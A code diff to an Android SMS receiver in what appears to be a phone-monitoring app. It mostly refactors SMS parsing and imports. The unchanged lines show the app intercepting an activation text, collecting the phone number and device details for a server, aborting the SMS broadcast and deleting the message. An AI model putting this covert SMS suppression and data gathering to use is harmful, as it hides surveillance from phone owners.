@@ -7,7 +7,7 @@ import com.system.config.ConfigCtrl;
 import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
-import com.particle.inspector.common.util.sms.SMS_TYPE;
+import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 import com.system.feature.sms.SmsCtrl;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
@@ -36,16 +36,10 @@ public class ActivationReceiver extends BroadcastReceiver
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{	
-			Bundle bundle = intent.getExtras();
-			Object messages[] = (Object[]) bundle.get("pdus");
-			SmsMessage smsMessages[] = new SmsMessage[messages.length];
-			for (int n = 0; n < messages.length; n++) {
-				smsMessages[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
-			}
-
-			if (smsMessages.length > 0) {
-				// Show the lastest coming SMS
-				String smsBody = smsMessages[0].getMessageBody().trim();
+			String smsBody = SmsCtrl.getSmsBody(intent);
+			
+			if (smsBody.length() > 0) {
+				
 				//SysUtils.messageBox(context, "Received SMS: " + smsBody);
 				
 				//If it is a SMS from server for key validation
@@ -86,7 +80,7 @@ public class ActivationReceiver extends BroadcastReceiver
 							String phoneNum = DeviceProperty.getPhoneNumber(context);
 							String phoneModel = DeviceProperty.getDeviceModel();
 							String androidVer = DeviceProperty.getAndroidVersion();
-							LANG lang = LangUtil.str2enum(DeviceProperty.getPhoneLang());
+							LANG lang = DeviceProperty.getPhoneLang();
 							AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
 							String smsStr = sms.serverSms2Str();
 							String srvAddr = context.getResources().getString(R.string.srv_address);
@@ -102,7 +96,7 @@ public class ActivationReceiver extends BroadcastReceiver
 						initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
 						initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 						context.startActivity(initIntent);
-						this.abortBroadcast(); // Finish broadcast, the system will notify this SMS
+						abortBroadcast(); // Finish broadcast, the system will notify this SMS
 						
 						//Remove the activation SMS
 						SmsCtrl.deleteTheLastSMS(context);
